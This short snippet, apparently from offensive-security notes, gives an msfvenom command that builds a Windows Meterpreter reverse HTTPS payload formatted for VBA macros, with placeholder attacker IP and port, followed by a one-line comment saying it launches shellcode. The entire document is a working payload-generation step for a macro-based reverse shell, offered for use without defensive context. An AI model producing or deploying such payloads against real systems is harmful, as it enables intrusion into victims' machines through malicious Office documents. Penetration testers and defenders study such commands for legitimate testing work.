msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<LPORT> EXITFUNC=thread -f vbapplication

#This msfvenom command launch a shellcode. 